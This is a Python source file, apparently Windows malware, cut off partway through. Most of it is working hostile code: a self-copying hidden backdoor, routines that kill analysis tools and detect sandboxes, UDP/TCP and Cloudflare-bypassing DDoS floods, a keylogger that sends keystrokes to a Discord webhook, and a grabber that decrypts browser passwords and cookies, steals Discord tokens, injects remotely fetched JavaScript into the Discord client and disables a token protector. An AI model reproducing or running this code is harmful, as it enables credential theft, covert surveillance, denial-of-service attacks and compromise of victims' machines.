'''
    CookiesKush420#9599
    github.com/Callumgm

'''

# System Modules
import os
import re
import ssl
import sys
import json
import hmac
import uuid
import ctypes
import socket
import shutil
import signal
import random
import asyncio
import zipfile
import sqlite3
import platform
import datetime
import threading
import subprocess

from multiprocessing import Process, active_children, cpu_count, Pipe
from binascii import hexlify, unhexlify
from hashlib import sha1, pbkdf2_hmac
from urllib.parse import urlparse
from re import findall, match
from tempfile import mkdtemp
from base64 import b64decode
from random import choice
from struct import unpack
from pathlib import Path
from typing import Tuple
from queue import Queue
from time import sleep
from ctypes import *


# Downloaded Modules
import wmi
import socks
import httpx
import psutil
import requests
import keyboard
import win32api
import cloudscraper
import win32process
import requests_toolbelt

import undetected_chromedriver as webdriver
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests.cookies import RequestsCookieJar
from Crypto.Util.number import long_to_bytes
from win32crypt import CryptUnprotectData
from browser_history import get_history
from Crypto.Util.Padding import unpad
from scapy.all import ARP, Ether, srp
from pyasn1.codec.der import decoder
from Crypto.Cipher import DES3, AES
from pynput.mouse import Controller
from PIL import ImageGrab
from pyotp import TOTP




'''
Create simple builder (that will also auto download the latest version of UPX and proceed to decompress it while compiling)

Add destroy pc command (ear rape, break system32, etc etc)
Add some creepy ass video after ransom or whatever
'''

#region Backdoor

backdoorr = False
def backdoor():
    folder              = "C:\\Windows_Logs"            # Get the new directory
    if not os.path.exists(folder): os.mkdir(folder)     # Create the directory if it doesn't exist
    backdoor_path       = folder + "\\svhost.exe"        # Path to the backdoor (make sure to change file extension depending on your file)
    file_path           = sys.argv[0]                   # Get the path to the current running file

    if file_path != backdoor_path:
        try:
            shutil.copy2(file_path, backdoor_path)      # Copy the file to the backdoor folder
            os.startfile(backdoor_path)                 # Start the file
            subprocess.call(f"icacls {folder} /deny Everyone:(OI)(CI)(DE,DC)",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            subprocess.call(f"attrib +h +s {folder}",stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            os._exit(1)
        except: pass
    else: 
        backdoorr = True
        return True

# if not backdoor(): os._exit(1)

#endregion

#region Functions

#region Anti Debug

#region Config

sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]

program_blacklist = [
    "httpdebuggerui.exe", 
    "wireshark.exe", 
    "HTTPDebuggerSvc.exe", 
    "fiddler.exe", 
    "regedit.exe", 
    "vboxservice.exe", 
    "df5serv.exe", 
    "processhacker.exe", 
    "vboxtray.exe", 
    "vmtoolsd.exe", 
    "vmwaretray.exe", 
    "ida64.exe", 
    "ollydbg.exe",
    "pestudio.exe", 
    "vmwareuser", 
    "vgauthservice.exe", 
    "vmacthlp.exe", 
    "x96dbg.exe", 
    "vmsrvc.exe", 
    "x32dbg.exe", 
    "vmusrvc.exe", 
    "prl_cc.exe", 
    "prl_tools.exe", 
    "xenservice.exe", 
    "qemu-ga.exe", 
    "joeboxcontrol.exe", 
    "ksdumperclient.exe", 
    "ksdumper.exe",
    "joeboxserver.exe"
]

vmcheck_switch = True
vtdetect_switch = True
listcheck_switch = True
anti_debug_switch = True
#endregion

def anti_debug():
    while True:
        sleep(0.7)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in program_blacklist):
                try: proc.kill()
                except(psutil.NoSuchProcess, psutil.AccessDenied): os._exit(1)

def block_dlls():
    while True:
        sleep(1)
        EvidenceOfSandbox = []
        allPids = win32process.EnumProcesses()
        for pid in allPids:
            try:
                hProcess = win32api.OpenProcess(0x0410, 0, pid)
                try:
                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
                    for dll in curProcessDLLs:
                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                        for sandboxDLL in sandboxDLLs:
                            if sandboxDLL in dllName:
                                if dllName not in EvidenceOfSandbox:
                                    EvidenceOfSandbox.append(dllName)
                finally: win32api.CloseHandle(hProcess)
            except: pass
        if EvidenceOfSandbox: os._exit(1)

def ram_check():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]

    memoryStatus = MEMORYSTATUSEX()
    memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

    if memoryStatus.ullTotalPhys/1073741824 < 1: os._exit(1)

def is_debugger():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()

    if (isDebuggerPresent): os._exit(1)

def disk_check():
    minDiskSizeGB = 50
    if len(sys.argv) > 1:
        minDiskSizeGB = float(sys.argv[1])

    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()

    diskSizeGB = diskSizeBytes/1073741824

    if diskSizeGB < minDiskSizeGB: os._exit(1)

def getip():
    ip = "None"
    try: ip = requests.get("https://api.ipify.org").text
    except: pass
    return ip

#region Info
ip = getip()
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
gpu = computer.Win32_VideoController()[0].Name
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
#endregion

def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv(): os._exit(1) # exit
    
    else: pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1: os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: os._exit(1)
                        
        if os.path.exists(vmware_dll): os._exit(1)
            
        if os.path.exists(virtualbox_dll): os._exit(1)   

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list: os._exit(1)


    registry_check()
    processes_and_files_check()
    mac_check()  

def listcheck():
    try:
        if hwid in hwidlist.text: os._exit(1)
    except: os._exit(1)

    try:
        if serveruser in pcusernamelist.text: os._exit(1)
    except: os._exit(1)

    try:
        if pc_name in pcnamelist.text: os._exit(1)
    except: os._exit(1)

    try:
        if ip in iplist.text: os._exit(1)
    except: os._exit(1)

    try:
        if mac in maclist.text: os._exit(1)
    except: os._exit(1)

    try:
        if gpu in gpulist.text: os._exit(1)
    except: os._exit(1)

# is_debugger(), ram_check(), disk_check()

# if anti_debug_switch:
#     try:
#         threading.Thread(target=anti_debug).start()
#         threading.Thread(target=block_dlls).start()
#     except: pass

# if vmcheck_switch: vmcheck()      
# if listcheck_switch: listcheck()

#endregion

#region ACE Commands

#region Cpu Stresser
FIB_N = 100

try: DEFAULT_CPU = cpu_count()
except NotImplementedError: DEFAULT_CPU = 1

#region Functions
def loop(conn):
    proc_info = os.getpid()
    conn.send(proc_info)
    conn.close()
    while True: fib(FIB_N)

def fib(n):
    if n < 2: return 1
    else: return fib(n - 1) + fib(n - 2)

def sigint_handler(signum, frame):
    procs = active_children()
    for p in procs: p.terminate()
    os._exit(1)

signal.signal(signal.SIGINT, sigint_handler)
#endregion

def pystress(exec_time, proc_num):
    procs = []
    conns = []

    for _ in range(proc_num):
        parent_conn, child_conn = Pipe()
        p = Process(target=loop, args=(child_conn,))
        p.start()
        procs.append(p)
        conns.append(parent_conn)

    sleep(exec_time)
    for p in procs: p.terminate()

def start_stresser(exec_time, proc_num):
    if __name__ == "__main__": pystress(exec_time, proc_num)

#endregion

#region Cursor Jiggler
def cursor_jiggle(id=0):
    cursor_jiggle.stop=0
    
    move_amount = 2
    mouse = Controller()

    def get_rand_pos():
        a = [True, False]
        return [choice(a), choice(a)]

    while 1:
        pos = get_rand_pos()
        cpos = mouse.position

        pos1 = cpos[0]
        pos2 = cpos[1]

        if pos[0] == True:
            pos1 = pos1 + move_amount
        elif pos[0] == False:
            pos1 = pos1 - move_amount
        else:
            pass

        if pos[1] == True:
            pos2 = pos2 + move_amount
        elif pos[1] == False:
            pos2 = pos2 - move_amount
        else:
            pass

        mouse.position = (pos1, pos2)

        sleep(0.05)
        
        if cursor_jiggle.stop==id:
            cursor_jiggle.stop=0
            break
#endregion

#region Network Scanner
def network_scan():
    def scan(ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
        
        clients = []
        for element in answerred:
            clients.append({
                "ip": element[1].psrc,
                "mac": element[1].hwsrc,
        })
        return clients

    def output_results(clients):
        out = ""
        for client in clients: out += f" {client['ip']} \t{client['mac']}\n"
        return out


    results = scan("192.168.0.1/24")
    o = output_results(results)
    return o
#endregion

#region ddos
#region Get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
 
def get_proxies():
	global proxies
	if not os.path.exists("./proxy.txt"):
		return False
	proxies = open("./proxy.txt", 'r').read().split('\n')
	return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        sleep(1)
    driver.quit()
    return False
#endregion

#region layer4

#region TCP
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass
#endregion

#region UDP
def runsender(host, port, th, t):
    payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass      
#endregion

#endregion

#region layer7

#region PXCFB
def LaunchPXCFB(url, th, t, proxies):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper, proxies, ))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper, proxies):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFB
def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#endregion
#endregion

#region Keylogger
class Keylogger: 
    def __init__(self, interval, reciver_webhook):
        now             = datetime.datetime.now()
        self.interval   = int(interval * 3600) # Convert secs to hours
        self.reciver    = DiscordWebhook(url=reciver_webhook, rate_limit_retry=True, username="Keylogger Logs")
        self.log        = ""
        self.dir        = mkdtemp()
        self.username   = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:

            if name == "space":
                name = " "

            elif name == "shift":
                name = ""

            elif name == "tab":
                name = "    "

            elif name == "ctrl":
                name = ""

            elif name == "backspace":
                name = ""
                self.log = self.log[:-1]

            elif name == "enter":
                name = "\n"
                
            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def report_logs(self):
        flag = False
        #region Check log length > 2000
        if len(self.log) < 1990:
            flag = True
            now = datetime.datetime.now()
            if os.path.exists(os.getenv("TEMP") + "\\caches.txt"): os.remove(os.getenv("TEMP") + "\\caches.txt")
            path = os.getenv("TEMP") + "\\caches.txt"
            with open(path, 'w+') as file:
                file.write(f'Keylogger Report From {self.username} Time: {now.strftime("%d/%m/%Y %H:%M")}\n\n')
                file.write(self.log)
                file.close()

            embed = DiscordEmbed(title=f"{self.username} Report", description="File uploaded", color='03b2f8')
            with open(path, "rb") as f: self.reciver.add_file(file=f.read(), filename='logs.txt')
            embed.set_footer(text=f'Time: {now.strftime("%d/%m/%Y %H:%M")}')

        else:
            embed = DiscordEmbed(title=f"{self.username} Report", description=self.log, color='03b2f8')
            now = datetime.datetime.now()
            embed.set_footer(text=f'Time: {now.strftime("%d/%m/%Y %H:%M")}')
        #endregion

        self.reciver.add_embed(embed)
        self.reciver.execute(remove_embeds=True, remove_files=True)

        if flag: os.remove(path)

    def report(self):
        if self.log:
            self.report_logs()    
        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)                     # Start the keylogger
        self.report()                                                   # Start the report thread
        keyboard.wait()                                                 # Wait for the user to press a key

#endregion

#region Data Grabber

config = {
    'webhook_protector_key': "KEY_HERE",
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': False,
    # if you want the file to run at startup
    'startup': False,
    # if you want the file to hide itself after run
    'hide_self': False,
}

Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")

class options(object):
    directory = ''
    password = ''
    masterPassword = ''

class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        except:
            return False
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def fetchConf(e: str) -> str or bool:
        return config.get(e)

    @staticmethod
    def findProfiles(name, path):
        folders = []
        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge", "CentBrowser", "Orbitum", "Epic Privacy Browser"]:
            folders = [element for element in os.listdir(
                path) if re.search("^Profile*|^Default$", element) != None]
        elif os.path.exists(path + '\\_side_profiles'):
            folders = [element for element in os.listdir(
                path + '\\_side_profiles')]
            folders.append('def')
        return folders

    @staticmethod
    def getShortLE(d, a):
        return unpack('<H', (d)[a:a+2])[0]

    @staticmethod
    def getLongBE(d, a):
        return unpack('>L', (d)[a:a+4])[0]

    @staticmethod
    def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData, options):
        hp = sha1(globalSalt+masterPassword).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1(hp+entrySalt).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    @staticmethod
    def decodeLoginData(data):
        asn1data = decoder.decode(
            b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext

class Cookies_Grabber(functions):
    def __init__(self, webhook: str):
        self.webhook = webhook
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + \
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        self.browsers = []
        self.paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\',
            'Torch': self.appdata + '\\Torch\\User Data\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\'
        }
        self.CKA_ID = unhexlify('f8000000000000000000000000000001')
        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens,
                        self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo, self.grab_browser_history]

        if self.fetchConf('hide_self'):
            function_list.append(self.hide)

        if self.fetchConf('kill_processes'):
            await self.killProcesses()

        if self.fetchConf('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            function_list.append(self.firefoxCookies)
            function_list.append(self.firefoxPasswords)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        await self.injector()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(sys.argv[0], self.startup_loc)
        except Exception:
            pass

    async def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata+self.sep+_dir
                disc_sep = discord+self.sep
                for __dir in os.listdir(os.path.abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = os.path.abspath(disc_sep+__dir)
                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                        if os.path.exists(inj_path):
                            if self.startup_loc not in sys.argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'initiation', exist_ok=True)
                                except PermissionError:
                                    pass
                            if "api/webhooks" in self.webhook:
                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                    "%WEBHOOK%", self.webhook)
                            else:
                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                    "%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
                            try:
                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                    indexFile.write(f)
                            except PermissionError:
                                pass
                            if self.fetchConf('kill_processes'):
                                os.startfile(app + self.sep + _dir + '.exe')

    async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
